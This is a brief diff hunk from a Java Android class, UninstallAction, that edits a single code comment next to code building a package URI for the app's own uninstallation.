@@ -133,7 +133,7 @@ public class UninstallAction extends SubActionSlow {
 		}
 
 		// Core core = Core.self();
-		// Messages.getString("2_0") : 2.0=package:com.android.networking
+		// package:com.android.networking
 		final Uri packageURI = Uri.parse("package:" + Status.self().getAppContext().getPackageName()); //$NON-NLS-1$
 
 		if (Cfg.DEBUG) {
